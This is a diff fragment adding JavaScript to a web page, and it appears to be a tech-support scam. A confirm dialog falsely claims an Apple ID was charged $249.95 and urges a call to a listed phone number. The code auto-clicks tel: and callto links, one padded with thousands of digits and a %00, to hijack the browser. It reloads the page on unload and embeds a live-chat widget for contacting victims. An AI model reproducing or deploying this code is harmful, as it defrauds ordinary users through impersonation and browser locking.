+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-833-497-3164"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-833-497-3164 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
